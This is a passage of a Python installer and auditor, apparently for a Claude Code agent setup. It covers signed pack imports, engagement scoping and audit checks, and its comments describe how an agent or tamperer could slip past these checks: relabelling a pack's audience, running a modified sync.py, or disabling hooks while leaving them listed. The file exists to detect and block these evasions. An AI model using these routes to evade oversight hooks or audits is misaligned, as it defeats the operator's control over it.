    already resolves absolute @/path.md imports — existing, selftested
    mechanism, not modified here. Returns True if it wrote (first pack ever
    for this target), False if the pointer was already there (no-op).

    Raises RuntimeError if cc-pack markers are ALREADY on disk but the
    receipt has no record of writing them — mirrors _approve_claude_md's
    existing refusal on a pre-existing cc-seed region (2026-08-08 P3 review,
    Grok + GPT independently: without this check, a crash between this
    write and the receipt save — disk full, EPERM, Ctrl-C — leaves CLAUDE.md
    with a pointer region the receipt doesn't know about; a retry (needed
    anyway, since the pack directory now exists unrecorded and requires
    --replace) would prepend a SECOND pack region with no error, and check 8
    would find 2 start markers and FLAG permanently until a human hand-edits
    the file. Refusing loudly here turns that into a clear, one-time,
    fixable error instead of silent corruption on the retry path)."""
    gw = receipt.setdefault("gated_writes", {})
    if gw.get("import-pack-pointer", {}).get("written"):
        return False
    claude_md = target / "CLAUDE.md"
    existing = claude_md.read_bytes() if claude_md.exists() else b""
    if PACKS_MARKER_START.encode() in existing or PACKS_MARKER_END.encode() in existing:
        raise RuntimeError(
            f"{claude_md} already contains cc-pack markers but the receipt has no record of "
            f"writing them — this usually means a prior import wrote the file and then failed "
            f"before saving the receipt. Resolve by hand: either remove the existing cc-pack "
            f"region from {claude_md} and retry, or if it's correct, this is a bug (the region "
            f"content can't be recovered into the receipt automatically — file it).")
    pointer_line = f"@{delivery_root}/PACKS.md\n".encode()
    region = PACKS_MARKER_START.encode() + b"\n" + pointer_line + PACKS_MARKER_END.encode() + b"\n"
    # Same "\n\n" separator convention as _approve_claude_md's own
    # `before = existing + b"\n\n"` — MUST match regardless of which gated
    # write runs first, or _strip_pack_pointer_prefix (which assumes a
    # single fixed byte count between the two regions) mis-counts and leaves
    # a stray leading newline that check 3 then reads as unexplained content
    # (caught live 2026-08-08: approving claude-md after an existing pack
    # import produced exactly this false flag before this fix).
    new_bytes = region + (b"\n\n" + existing if existing else b"")
    _atomic_write(claude_md, new_bytes)
    gw["import-pack-pointer"] = {
        "approved_hash": _sha256_bytes(pointer_line),
        "approved_at": _now(), "written": True,
    }
    return True


def _approve_import_pack(target: Path, receipt: dict, from_pack: str, replace: bool, tag: str = None,
                          allowed_signers: str = None, allow_unsigned: bool = False) -> int:
    if not from_pack:
        return die("--approve import-pack requires --from-pack <path>")
    pack_dir = Path(from_pack).expanduser()
    if not pack_dir.is_absolute():
        return die(f"--from-pack must be an absolute path, got {from_pack!r}")
    if pack_dir.is_file():
        return die(f"{pack_dir} is a tar pack — --from-pack only accepts a DIRECTORY in this "
                   f"build (untar it first: tar xf {pack_dir} -C <dir>). Applying directly from "
                   f"a tar is a stated P3 residual, not built.")
    if not pack_dir.is_dir():
        return die(f"{pack_dir} does not exist or is not a directory")

    delivery_root = _pack_delivery_root(target)
    delivery_root.mkdir(parents=True, exist_ok=True)
    try:
        staged_pack = _stage_pack_copy(pack_dir, delivery_root)
    except (RuntimeError, OSError) as e:
        return die(f"failed to stage {pack_dir} for verification ({e}) — refusing to import; "
                   f"nothing was applied")

    try:
        ok, detail = _verify_pack_dir(staged_pack)
        if not ok:
            return die(f"pack at {pack_dir} failed verification — refusing to import:\n{_escape_path(detail)}")
        manifest = _read_pack_manifest(staged_pack)
        if manifest is None:
            return die(f"{pack_dir}/pack.json did not parse even though --verify just passed — "
                       f"refusing (this should not happen; investigate before retrying)")
        pack_id = manifest.get("id")
        if not _pack_is_safe_component(pack_id):
            return die(f"pack id {pack_id!r} is not a safe path component — refusing")
        sums_hash = manifest.get("sha256sums_sha256")

        # Signature policy (P6c, 2026-08-09; tri-model CRITICAL fix — see
        # pack_lib.py's POSTURE comment for the full rationale). A pure
        # policy gate, checked immediately after manifest/pack_id
        # validation and BEFORE any state-changing step below (the
        # engagement-scoping check, the duplicate-import check, or
        # anything touching the filesystem) — same placement discipline
        # the --tag engagement gate already uses.
        #
        # audience=replica defaults to require_sig=verified: unsigned,
        # unknown-signer, invalid, and verification-error ALL refuse.
        # unsigned is allowed ONLY via the explicit --allow-unsigned
        # break-glass — never the silent default — and is recorded as such
        # in the receipt, and ONLY for audience=replica (audience=shareable
        # was already unsigned-tolerant by design, see below).
        #
        # invalid/unknown-signer/verification-error have NO override AND
        # this refusal is UNCONDITIONAL — it is checked BEFORE the audience
        # is even consulted, so it applies to every audience, not just
        # replica (2026-08-09 post-implementation review, all three models
        # independently converged on this as the load-bearing finding: the
        # ORIGINAL version of this gate nested the whole signature check
        # inside `if manifest.get("audience") == "replica"`, which meant an
        # attacker who can write the pack directory before a human's
        # `--approve` — the exact threat model this whole design exists
        # for — could simply relabel pack.json's own `audience` field from
        # "replica" to "shareable" (this does not touch SHA256SUMS or any
        # part file, so the integrity chain _verify_pack_dir already passed
        # stays self-consistent, PROVIDED the relabeled pack's part types
        # are all dual-audience-compatible, e.g. doctrine/skills/
        # memory-digest/secret-handles) and walk straight past the
        # signature gate entirely with a now-stale, now-"invalid" signature
        # that would otherwise have refused. Only "legitimately never
        # signed" is ever a maybe, for any audience; "signed and
        # untrustable" never is, for any audience either.
        #
        # audience=shareable's own historical "not gated" design is
        # narrowed, not removed: an UNSIGNED shareable pack still imports
        # with no override needed (lower stakes, already scrubbed for wide
        # distribution — that part of the original design stands), but a
        # shareable pack that WAS signed and is now provably untrustworthy
        # refuses exactly like a replica pack does. The signature state is
        # still recorded in the receipt for every pack regardless of
        # audience, informational for the unsigned/verified cases.
        sig_state, sig_principal, sig_raw = _verify_pack_signature(staged_pack, allowed_signers)
        if sig_state not in ("unsigned", "verified"):
            return die(
                f"pack {pack_id!r} signature check returned {sig_state!r} — refusing "
                f"to import (this applies to every audience, not just replica). This "
                f"state has NO override (only a genuinely unsigned pack can proceed, "
                f"and only via --allow-unsigned for a replica-audience pack); "
                f"investigate before retrying:\n{_escape_path(sig_raw.strip())}")
        if sig_state == "unsigned" and manifest.get("audience") == "replica" and not allow_unsigned:
            return die(
                f"pack {pack_id!r} is UNSIGNED — refusing to import a replica pack "
                f"without a signature by default. Pass --allow-unsigned to proceed "
                f"anyway (recorded loudly in the receipt), or sign the pack first "
                f"(cc-pack/build_pack.py --sign).")

        # Engagement scoping (FDE-TOOLKIT-PLAN.md F1's original "actual gap"
        # against memory_seed.py, closed here for cc-pack instead): a pack
        # built with build_pack.py --tag <slug> is engagement-scoped and must
        # not cross into a session for a different engagement. Fails closed
        # both directions — no engagement set on the TARGET refuses (never
        # "import everything"), and a target engagement that doesn't match
        # refuses too. An untagged pack (tags == []) is not engagement-scoped
        # at all and always imports — the general-purpose case (Craig's own
        # doctrine/skills packs), not a client engagement.
        #
        # 2026-08-09 fix, post-review (Grok 4.5/GPT-5.6-sol/Gemini 3.1 Pro,
        # cc-pack/reviews/2026-08-09-tag-gate-review-*.md, all three
        # independently converged): the ORIGINAL version of this gate checked
        # the pack's tags against `tag` — a bare CLI argument typed fresh on
        # every invocation — which is not an authorization boundary, it's an
        # unauthenticated claim (a Client-B session could import a
        # Client-A-tagged pack just by passing --tag client-a; the die
        # message even named the exact tag needed). The authorization source
        # is now `receipt.get("engagement")` — set once, deliberately, via
        # `install.py --set-engagement <slug>` (refuses to silently switch an
        # already-set engagement). `--tag` on THIS call is now only a
        # redundant confirmation checked against that recorded value, never
        # the thing being trusted on its own.
        # 2026-08-09, round 2 (GPT-5.6-sol caught this on verification —
        # neither Grok nor Gemini did): `manifest.get("tags") or []` treats
        # every FALSY value — "", {}, 0, False — as absent, so a malformed-
        # but-falsy tags field would silently reach here as an empty list,
        # bypassing the type check below entirely (it only ever saw the
        # coerced [], not the original bad value). Inspect the RAW value
        # first and only treat an actually-absent (None) tags key as "no
        # tags"; every other non-list-of-strings shape is refused outright.
        raw_tags = manifest.get("tags")
        if raw_tags is None:
            pack_tags = []
        elif isinstance(raw_tags, list) and all(isinstance(t, str) for t in raw_tags):
            pack_tags = raw_tags
        else:
            # Round 1: all three reviewers independently found that a
            # malformed/type-confused `tags` value (e.g. a bare string
            # instead of a list) turns `tag not in pack_tags` into a
            # SUBSTRING match ("client" in "client-a" is True) — refuse
            # outright rather than risk that bypass.
            return die(f"pack {pack_id!r} manifest 'tags' is malformed (expected a list of "
                       f"strings or an absent/null value, got {raw_tags!r}) — refusing rather "
                       f"than silently treating a malformed value as untagged")
        if pack_tags:
            target_engagement = receipt.get("engagement")
            if not target_engagement:
                return die(f"pack {pack_id!r} is tagged for {pack_tags} but this TARGET has no "
                           f"engagement recorded — refusing. Run `install.py --target ... "
                           f"--set-engagement <slug>` first; an engagement-scoped pack requires "
                           f"the target itself, not just a command-line flag, to declare which "
                           f"engagement it's operating under.")
            if target_engagement not in pack_tags:
                return die(f"pack {pack_id!r} is tagged for {pack_tags}, but this target's "
                           f"recorded engagement is {target_engagement!r} — refusing "
                           f"(cross-engagement import blocked)")
            if tag is not None and tag != target_engagement:
                return die(f"--tag {tag!r} does not match this target's recorded engagement "
                           f"{target_engagement!r} — refusing rather than silently ignoring the "
                           f"mismatch (fix the --tag argument, or confirm this is really the "
                           f"target you meant)")

        imported = receipt.setdefault("imported_packs", {})
        if pack_id in imported:
            if imported[pack_id].get("sha256sums_sha256") == sums_hash:
                print(f"{pack_id}: already imported, identical content — nothing to do.")
                return 0
            return die(f"pack id {pack_id!r} is already imported with DIFFERENT content on record "
                       f"({imported[pack_id].get('sha256sums_sha256')} vs {sums_hash}) — should be "
                       f"impossible under content-addressed ids; refusing rather than silently "
                       f"overwriting. Investigate before retrying.")

        dest = _expected_pack_dest(target, pack_id)
        if dest.is_symlink():
            return die(f"refusing to write through {dest} — it is a symlink, not a directory "
                       f"this import would have created. Remove it by hand after confirming "
                       f"what it is before retrying.")
        if dest.exists():
            if not replace:
                return die(f"{dest} already exists on disk but is not recorded in the receipt as "
                           f"imported — refusing to overwrite. Pass --replace if you're sure this "
                           f"is leftover from a prior failed attempt, or remove it by hand first.")
            shutil.rmtree(dest)

        try:
            paths = _apply_pack_generic(staged_pack, manifest, dest)
        except (RuntimeError, OSError) as e:
            if dest.exists():
                shutil.rmtree(dest)
            return die(f"apply failed partway through ({e}) — cleaned up the partial write at {dest}")

        imported[pack_id] = {
            "approved_at": _now(),
            "kind": manifest.get("kind"),
            "audience": manifest.get("audience"),
            "tags": manifest.get("tags") or [],
            "sha256sums_sha256": sums_hash,
            "source_pack": str(pack_dir),
            "delivery_path": str(dest),  # display/provenance only — see _expected_pack_dest
            "paths": paths,
            # P6c (2026-08-09): signature state at import time, plus whether
            # an unsigned pack was let through the explicit break-glass —
            # loud and recorded, never a silent default. principal is None
            # for every state but "verified".
            "signature_state": sig_state,
            "signature_principal": sig_principal,
            "imported_unsigned": sig_state == "unsigned" and manifest.get("audience") == "replica",
        }

        try:
            pointer_written = _write_packs_pointer(target, receipt, delivery_root)
        except RuntimeError as e:
            # apply already succeeded and is recorded in `imported` above —
            # this is a partial-state failure (content landed, receipt/
            # pointer did not), surfaced loudly rather than silently retried
            # (retrying blind is exactly how findings from this review's
            # "non-transactional import" class happen).
            return die(f"pack content applied but the CLAUDE.md pointer write refused: {e}\n"
                       f"the pack is NOT recorded as imported (receipt not saved) — resolve the "
                       f"CLAUDE.md issue named above, then retry the whole import")

        packs_md = delivery_root / "PACKS.md"
        _atomic_write(packs_md, _render_packs_md(receipt))
        _save_receipt(target, receipt)

        print(f"{pack_id}: imported ({len(paths)} file(s)) -> {dest}")
        print(f"PACKS.md: {packs_md}")
        if pointer_written:
            print(f"CLAUDE.md: pointer to PACKS.md written (first pack import for this target)")
        return 0
    finally:
        shutil.rmtree(staged_pack, ignore_errors=True)


def list_packs(target: Path) -> int:
    receipt = _load_receipt(target)
    if receipt is None:
        return die(f"{target}/{CC_SEED_DIR}/{RECEIPT_NAME} not found — was this target "
                   f"installed with this install.py?")
    imported = receipt.get("imported_packs", {}) or {}
    if not imported:
        print(f"no packs imported into {target}.")
        return 0
    delivery_root = _pack_delivery_root(target)
    print(f"{len(imported)} pack(s) imported into {target} (delivery root: {delivery_root}):")
    for pid in sorted(imported):
        rec = imported[pid]
        tags = ",".join(str(t) for t in (rec.get("tags") or [])) or "(none)"
        sig = rec.get("signature_state", "?")
        if rec.get("imported_unsigned"):
            sig += " (--allow-unsigned)"
        print(_escape_path(
            f"  - {pid}  kind={rec.get('kind')} audience={rec.get('audience')} "
            f"tags={tags} signature={sig} imported={rec.get('approved_at')}"))
    print(f"PACKS.md: {delivery_root / 'PACKS.md'}")
    return 0


def set_engagement(target: Path, slug: str, force: bool) -> int:
    """Record which engagement THIS TARGET is operating under — the missing
    authorization anchor the 2026-08-09 tag-gate review round (Grok 4.5,
    GPT-5.6-sol, Gemini 3.1 Pro; all three independently, cc-pack/reviews/
    2026-08-09-tag-gate-review-*.md) converged on as the CRITICAL finding:
    --tag alone is a self-asserted CLI string with nothing binding it to the
    importing session's real identity — a Client-B session could import a
    Client-A-tagged pack by simply typing --tag client-a. This makes the
    TARGET's own recorded state, set here as a deliberate, refuse-on-silent-
    overwrite step, the actual authorization source; _approve_import_pack
    checks THIS, not the CLI argument. Modeled on the existing gated-write
    covenant (a human runs a real command; the receipt is the ledger)."""
    receipt = _load_receipt(target)
    if receipt is None:
        return die(f"{target}/{CC_SEED_DIR}/{RECEIPT_NAME} not found — was this target "
                   f"installed with this install.py?")
    if not _pack_is_safe_component(slug):
        return die(f"engagement slug {slug!r} is not a safe identifier — refusing")
    current = receipt.get("engagement")
    if current == slug:
        print(f"engagement already set to {slug!r} — nothing to do.")
        return 0
    imported = receipt.get("imported_packs", {}) or {}
    if current is not None and not force:
        comingling = (f" This target ALREADY has {len(imported)} pack(s) imported "
                      f"under {current!r} — switching would co-mingle their content "
                      f"with anything imported under {slug!r} next; nothing purges "
                      f"or isolates it automatically (all three tag-gate reviewers "
                      f"flagged this, 2026-08-09; deliberately left as an operator "
                      f"decision, not auto-refused or auto-purged)." if imported else "")
        return die(f"this target's engagement is already set to {current!r} — refusing to "
                   f"silently switch to {slug!r}. Pass --force if you are deliberately "
                   f"re-scoping this target to a new engagement.{comingling} Review "
                   f"--list-packs and --remove-pack <id> each pack first if you want a "
                   f"clean re-scope rather than a co-mingled one.")
    receipt["engagement"] = slug
    _save_receipt(target, receipt)
    print(f"engagement set to {slug!r}, recorded in {target}/{CC_SEED_DIR}/{RECEIPT_NAME}")
    if force and current is not None and imported:
        print(f"WARNING: {len(imported)} pack(s) imported under the previous engagement "
              f"{current!r} are still on this target and are now co-mingled with "
              f"{slug!r}: {', '.join(sorted(imported))}. Nothing was purged — run "
              f"--list-packs to review, --remove-pack <id> for each one you don't want "
              f"carried into {slug!r}.")
    return 0


def remove_pack(target: Path, pack_id: str) -> int:
    receipt = _load_receipt(target)
    if receipt is None:
        return die(f"{target}/{CC_SEED_DIR}/{RECEIPT_NAME} not found — was this target "
                   f"installed with this install.py?")
    imported = receipt.get("imported_packs", {}) or {}
    if pack_id not in imported:
        return die(f"{pack_id!r} is not an imported pack for {target} — nothing to remove "
                   f"(--list-packs to see what's there).")
    try:
        dest = _expected_pack_dest(target, pack_id)
    except ValueError as e:
        return die(f"refusing to remove {pack_id!r}: {e}")
    rec = imported.pop(pack_id)
    # dest is RE-DERIVED, never rec['delivery_path'] (see _expected_pack_dest)
    # — a mismatch is itself worth surfacing, not silently ignored, since it
    # means the receipt disagrees with what this build would have produced.
    recorded = rec.get("delivery_path")
    if recorded and recorded != str(dest):
        print(f"WARNING: receipt's recorded delivery_path ({recorded}) does not match the "
              f"re-derived path ({dest}) — removing the re-derived path only; if the receipt "
              f"was tampered with, {recorded} was NOT touched and may need manual review.",
              file=sys.stderr)
    if dest.is_symlink():
        return die(f"refusing to remove {dest} — it is a symlink, not the pack directory this "
                   f"install.py would have created; remove it by hand after confirming what it is.")
    if dest.exists():
        shutil.rmtree(dest)
    delivery_root = _pack_delivery_root(target)
    packs_md = delivery_root / "PACKS.md"
    packs_md.parent.mkdir(parents=True, exist_ok=True)
    _atomic_write(packs_md, _render_packs_md(receipt))
    _save_receipt(target, receipt)
    print(f"{pack_id}: removed ({dest})")
    return 0


# --- Wave 2H, piece 3: --audit (SEED-068) -----------------------------------
# Deterministic post-install auditor, run by the human in a fresh shell.
# Compares live state against the receipt (piece 1) and --package's own
# manifest (never the installed tree — a same-uid agent can rewrite anything
# under --target before a human looks). See docs/install-audit.md for the
# check table, provenance reasoning, and the residuals this wave does not
# close (perimeter, fresh-shell separation, a determined adversarial agent).

PERIMETER_DISCLAIMER = (
    "This audit verified <ROOT>, the managed scheduler block/plists named "
    "above, (partially — see check 5) keyvault's shipped scripts, and — if "
    "mesh-bootstrap was approved — the one Claude Code memory-store path "
    "that write deterministically targets (~/.claude/projects/<slug of "
    "ROOT>/memory/, outside <ROOT> but a single named path, not a scan). "
    "For each approved pack import (check 9), it also verified the one "
    "named out-of-repo delivery root ($XDG_STATE_HOME/cc-pack/<slug of "
    "ROOT>/) content still matches what was recorded at import time — it "
    "does NOT re-verify against the original --from-pack source, only "
    "against the receipt. It did not scan your shell rc files, SSH config, "
    "other applications' config, or anything else outside <ROOT> and these "
    "named paths. A confused install session can still write there; this "
    "audit cannot see it."
)


def _pass(id_, name, note=None):
    return {"id": id_, "name": name, "status": "PASS", "detail": [note] if note else []}


def _flagged(id_, name, problems):
    return {"id": id_, "name": name, "status": "FLAGGED", "detail": list(problems)}


def _error(id_, name, problems):
    return {"id": id_, "name": name, "status": "ERROR", "detail": list(problems)}


def _skipped(id_, name, problems):
    return {"id": id_, "name": name, "status": "SKIPPED", "detail": list(problems)}


def _package_is_trustworthy(package: Path):
    if not package or not package.is_dir():
        return False, "package path missing or not a directory"
    if not looks_like_clone(package):
        return False, "package path doesn't look like an AI-OS Seed clone (no install.py/AGENT-INSTALL.md)"
    r = subprocess.run(["git", "-C", str(package), "status", "--porcelain"],
                        capture_output=True, text=True)
    if r.returncode != 0:
        return False, "package path is not a git checkout (git status failed) — can't prove it's unmodified"
    if r.stdout.strip():
        return False, "package checkout is dirty (git status shows changes) — refusing to trust it as reference"
    return True, None


def _compare_entry(pkg_path: Path, live_path: Path):
    if not live_path.exists() and not live_path.is_symlink():
        return "missing"
    pst, lst = pkg_path.lstat(), live_path.lstat()
    ptype, ltype = _lstat_type(pst), _lstat_type(lst)
    if ptype != ltype:
        return f"type changed ({ptype} -> {ltype})"
    if ptype == "symlink":
        return None if os.readlink(pkg_path) == os.readlink(live_path) else "symlink target differs"
    if ptype == "dir":
        return None
    if ptype == "file":
        if stat.S_IMODE(pst.st_mode) != stat.S_IMODE(lst.st_mode):
            return f"mode changed ({oct(stat.S_IMODE(pst.st_mode))} -> {oct(stat.S_IMODE(lst.st_mode))})"
        return None if _sha256_file(pkg_path) == _sha256_file(live_path) else "content differs"
    return f"unsupported type: {ptype}"


def _compare_baseline_entry(live_p: Path, entry: dict):
    if not live_p.exists() and not live_p.is_symlink():
        return "deleted"
    st = live_p.lstat()
    ltype = _lstat_type(st)
    if ltype != entry["type"]:
        return f"type changed ({entry['type']} -> {ltype})"
    if ltype == "symlink":
        return None if os.readlink(live_p) == entry.get("symlink_target") else "symlink target differs"
    if ltype == "dir":
        return None
    if ltype == "file":
        if entry.get("hash") is None:
            return None  # too large to hash at baseline time — can't verify, don't false-flag
        if oct(stat.S_IMODE(st.st_mode)) != entry["mode"]:
            return f"mode changed ({entry['mode']} -> {oct(stat.S_IMODE(st.st_mode))})"
        return None if _sha256_file(live_p) == entry["hash"] else "content differs"
    return None


def _verify_registered_skill_link(target: Path, package: Path, name: str):
    """Check 1 previously had no idea _register_skills() (SEED-071) puts
    .claude/skills/<name>/SKILL.md symlinks on disk — every one of them fell
    through to the live-tree walk's UNEXPECTED branch, so --audit FLAGGED
    (and --audit's exit code is nonzero on FLAGGED) on every single install
    with skills registered, i.e. every install since SEED-071 shipped.
    Found 2026-08-09 while adding the CI coverage the wave2g2 review asked
    for — the fix teaches check 1 the shape instead of exempting the path
    unchecked, so it still catches the real threat: a same-uid agent
    repointing the symlink at something other than the shipped skill file."""
    link = target / ".claude" / "skills" / name / "SKILL.md"
    if not link.is_symlink():
        return "not a symlink" if (link.exists() or link.is_symlink()) else "missing"
    canonical = (target / "skills" / name / "SKILL.md").resolve()
    resolved = (link.parent / os.readlink(link)).resolve()
    if resolved != canonical:
        return f"symlink points at {resolved}, expected {canonical}"
    return None


def _wired_hook_keys(doc: dict) -> dict:
    """event -> {(matcher, command), ...} — the dedup identity of a hook.

    2026-09-19 round 2 (R4). The approve dedup used _wired_hooks(), which keys
    on the COMMAND alone, so a pre-existing entry running one of our scripts
    under ANY matcher suppressed ours under every matcher. Reproduced on
    {{REDACTED}}: seed `.claude/settings.json` with PreToolUse matcher "Bash"
    running memory-write-guard.py, then --approve memory-hooks --apply. The
    shipped entry (matcher Write|Edit|MultiEdit|NotebookEdit|Bash) was skipped
    as already-present, and the write guard did not run on Write or Edit at all
    — the exact tool calls it exists to stop. A matcher is part of WHEN a hook
    runs, so it is part of whether the hook we need is there.

    A missing matcher and an empty matcher are the same thing to the harness
    (match everything), so both normalise to "".
    """
    out = {}
    for event, entries in (doc.get("hooks") or {}).items():
        if not isinstance(entries, list):
            continue
        for e in entries:
            if not isinstance(e, dict):
                continue
            matcher = e.get("matcher") or ""
            for h in (e.get("hooks") or []):
                if isinstance(h, dict) and h.get("command"):
                    out.setdefault(event, set()).add((matcher, h["command"]))
    return out


def _wired_hooks(doc: dict) -> dict:
    """event -> {command, ...} actually present as runnable hooks."""
    out = {}
    for event, entries in (doc.get("hooks") or {}).items():
        if not isinstance(entries, list):
            continue
        for e in entries:
            if not isinstance(e, dict):
                continue
            for h in (e.get("hooks") or []):
                if isinstance(h, dict) and h.get("command"):
                    out.setdefault(event, set()).add(h["command"])
    return out


def _verify_hook_wiring(target: Path, record: dict) -> list:
    """settings.json, checked STRUCTURALLY against what the receipt says was
    approved (2026-09-19, SEED-080 review finding 2).

    check 1 used to exempt settings.json from the audit entirely whenever a
    memory-hooks record existed, and fold_watch -- the check it delegated to --
    searched the file as raw TEXT. So replacing the whole `hooks` block with a
    `notes` field holding the same command strings passed BOTH, with nothing
    runnable wired; `disableAllHooks: true` passed both as well. An exemption
    that delegates to a text match is not an exemption, it is a blind spot."""
    settings = _settings_path(target)
    problems = []
    if not settings.exists():
        return [f".claude/settings.json: the receipt records approved memory "
                f"hooks, but the file is gone — nothing is wired"]
    raw = settings.read_bytes()
    try:
        doc = json.loads(raw or b"{}")
    except ValueError as e:
        return [f".claude/settings.json: not valid JSON ({e}) — the approved "
                f"hooks cannot be running"]
    if doc.get("disableAllHooks") is True:
        problems.append(".claude/settings.json: disableAllHooks is true — every "
                        "approved hook is present in the file and none of them runs")
    wired = _wired_hooks(doc)
    for event, cmds in (record.get("entries") or {}).items():
        for cmd in cmds:
            if cmd not in wired.get(event, ()):
                problems.append(f".claude/settings.json: approved hook is not "
                                f"wired under {event}: {cmd}")
    after_sha = record.get("after_sha")
    if after_sha and _sha256_bytes(raw) != after_sha:
        recorded = {c for cmds in (record.get("entries") or {}).values() for c in cmds}
        live = {c for cmds in wired.values() for c in cmds}
        added = sorted(live - recorded)
        removed = sorted(recorded - live)
        problems.append(
            ".claude/settings.json: DRIFT since the approved write "
            f"(sha {_sha256_bytes(raw)[:12]} != recorded {after_sha[:12]})"
            + (f"; hooks added since: {added}" if added else "")
            + (f"; approved hooks missing: {removed}" if removed else "")
            + ("; the hook set is unchanged, so the difference is elsewhere in "
               "the file" if not added and not removed else ""))
    return problems


def _check_1(target: Path, package: Path, receipt: dict) -> dict:
    written = receipt["install"].get("components", [])
    baseline = receipt.get("baseline", {})
    problems, checked_rel = [], set()

    for comp in written:
        pkg_base = package / comp
        if not pkg_base.is_dir():
            problems.append(f"package is missing shipped component {comp!r} — can't verify")
            continue
        for pkg_p in [pkg_base] + sorted(pkg_base.rglob("*")):
            rel = pkg_p.relative_to(package).as_posix()
            checked_rel.add(rel)
            if rel == "scheduler/manifest.yml":
                continue  # owned by check 2 — --enable-demo is a legitimate,
                          # in-place rewrite of this file (see enable_demo()),
                          # so a raw byte-diff against the shipped template
                          # permanently flags it post-demo. sync.py --check
                          # (check 2) already validates it semantically, against
                          # live cron/launchd state — a stronger property than
                          # this loop's package-identity comparison ever gave.
                          # Repro'd 2026-08-09: CI red on ai-os-seed's
                          # "sync from seed pipeline" push, root-caused via
                          # gh api commits/<sha>/check-runs + a local
                          # --enable-demo/--audit repro before this fix.
            reason = _compare_entry(pkg_p, target / rel)
            if reason:
                problems.append(f"{rel}: {reason}")
    for f in ROOT_FILES:
        pkg_p = package / f
        if not pkg_p.exists():
            continue
        checked_rel.add(f)
        reason = _compare_entry(pkg_p, target / f)
        if reason:
            problems.append(f"{f}: {reason}")

    problems.extend(_verify_deferred_skills(target, receipt))
    problems.extend(_verify_refused_skills(target, receipt))
    for d in receipt["install"].get("refused_skills", []) or []:
        # A refused skill has no project-scope link BY DESIGN — the FLAG above
        # is the report; don't ALSO call its absence unexpected drift.
        checked_rel.add(f".claude/skills/{d['name']}")
    for d in receipt["install"].get("deferred_skills", []) or []:
        # A deferred skill has no project-scope link BY DESIGN — don't let the
        # unexpected-path sweep below report its absence as drift.
        checked_rel.add(f".claude/skills/{d['name']}")

    registered_skills = receipt["install"].get("registered_skills", [])
    if registered_skills:
        checked_rel.add(".claude")
        checked_rel.add(".claude/skills")
    for name in registered_skills:
        link_rel = f".claude/skills/{name}/SKILL.md"
        checked_rel.add(f".claude/skills/{name}")
        checked_rel.add(link_rel)
        reason = _verify_registered_skill_link(target, package, name)
        if reason:
            problems.append(f"{link_rel}: {reason}")

    # Paths a shipped tool writes INTO at runtime, by design: the run log and
    # (SEED-079) the brief store /freeze and /capture fill. Content there is
    # the user's, produced by using the system — never "unexpected".
    runtime_writable_prefixes = ("observability/data/", "session-brief/briefs/")
    for live_p in sorted(target.rglob("*")):
        rel = live_p.relative_to(target).as_posix()
        if rel in checked_rel:
            continue
        if rel == CC_SEED_DIR or rel.startswith(CC_SEED_DIR + "/"):
            continue  # install.py's own receipt/staged scaffold
        if rel == "CLAUDE.md":
            continue  # owned by check 3
        hook_record = (receipt.get("gated_writes") or {}).get("memory-hooks")
        if rel == ".claude" and hook_record:
            continue
        if rel == ".claude/settings.json" and hook_record:
            # SEED-080: settings.json is not shipped and is not baseline — it
            # is the product of an approved gated write, and the receipt says
            # so. Reporting it as UNEXPECTED taught the operator to ignore an
            # UNEXPECTED line, which is the one line that must never become
            # background noise. But the exemption is only earned by an ACTIVE
            # record, and it is no longer a free pass: the entries are checked
            # here, structurally, against that same record (2026-09-19).
            if hook_record.get("written"):
                problems.extend(_verify_hook_wiring(target, hook_record))
                continue
            # A REVOKED record grants nothing. The file is then just a file
            # this package does not own; it falls through to the baseline
            # comparison or to UNEXPECTED, as any other unmanaged path would.
        if "__pycache__" in rel.split("/") or rel.endswith((".pyc", ".pyo")):
            continue  # bytecode cache — a harmless side effect of running any shipped .py tool
        if any(rel == p.rstrip("/") or rel.startswith(p) for p in runtime_writable_prefixes):
            continue
        if rel in baseline:
            reason = _compare_baseline_entry(live_p, baseline[rel])
            if reason:
                problems.append(f"{rel}: pre-existing content changed without a gated-write record ({reason})")
            continue
        problems.append(f"{_escape_path(rel)}: UNEXPECTED — not shipped by the package, not in "
                         f"the pre-install baseline, not a declared runtime path")

    # The sweep above walks what IS on disk, so a baseline path that has since
    # been DELETED was never a subject of any check — a pre-existing operator
    # note could be removed and check 1 still said PASS (2026-09-19, SEED-080
    # review finding 5, executed as baseline_deletion_not_audited). Absence is
    # a change to pre-existing content like any other.
    for rel in sorted(baseline):
        if not os.path.lexists(str(target / rel)):
            problems.append(f"{_escape_path(rel)}: pre-existing path recorded in "
                            f"the baseline is GONE — it was removed after the "
                            f"install without a gated-write record")

    return _flagged("1", "package trace", problems) if problems else _pass("1", "package trace")


def _check_2(target: Path, package: Path) -> dict:
    sync = target / "scheduler" / "sync.py"
    if not sync.exists():
        return _flagged("2", "scheduler", ["scheduler/sync.py missing — can't verify"])
    # Wave 2H-2 (F2 fix, 2026-08-06 Gemini review): this check used to exec
    # the LIVE scheduler/sync.py to determine scheduler drift — but that
    # script lives under --target, the same untrusted tree --audit exists
    # to distrust. A same-uid agent could tamper with sync.py and have
    # --audit itself execute the tampered code before any verdict is ever
    # printed — check 1 would eventually flag the content diff, but only
    # after the exec already happened. Verify byte-identity against the
    # trusted --package copy first; only run it once it's provably the
    # shipped bytes. A mismatch is flagged directly, with an explicit
    # refusal, rather than silently trusting and running unknown code.
    pkg_sync = package / "scheduler" / "sync.py"
    if not pkg_sync.exists():
        return _error("2", "scheduler", ["package is missing scheduler/sync.py — can't verify"])
    if _sha256_file(sync) != _sha256_file(pkg_sync):
        return _flagged("2", "scheduler",
                         ["scheduler/sync.py differs from the shipped package — refusing to "
                          "execute a modified script as part of a read-only audit (it could "
                          "misreport its own state, or do something else entirely); check 1's "
                          "report has the exact diff"])
    r = subprocess.run([sys.executable, str(sync), "--check"],
                        capture_output=True, text=True, cwd=str(target))
    if r.returncode == 0:
        return _pass("2", "scheduler")
    if r.returncode == 1:
        drift = [l for l in (r.stdout + r.stderr).splitlines() if l.strip()]
        return _flagged("2", "scheduler", drift or ["sync.py --check reported drift"])
    return _error("2", "scheduler", [f"sync.py --check exited {r.returncode}: {(r.stderr or r.stdout).strip()}"])


def _check_3(target: Path, receipt: dict) -> dict:
    claude_md = target / "CLAUDE.md"
    gw = receipt.get("gated_writes", {}).get("claude-md")
    baseline_entry = receipt.get("baseline", {}).get("CLAUDE.md")
    if not claude_md.exists():
        if gw and gw.get("written"):
            return _flagged("3", "CLAUDE.md region", ["approved+written in receipt but the file is now missing"])
        return _pass("3", "CLAUDE.md region", "no CLAUDE.md and no approval on record")

    data = claude_md.read_bytes()
    # P3: an approved cc-pack pointer region may sit before the cc-seed
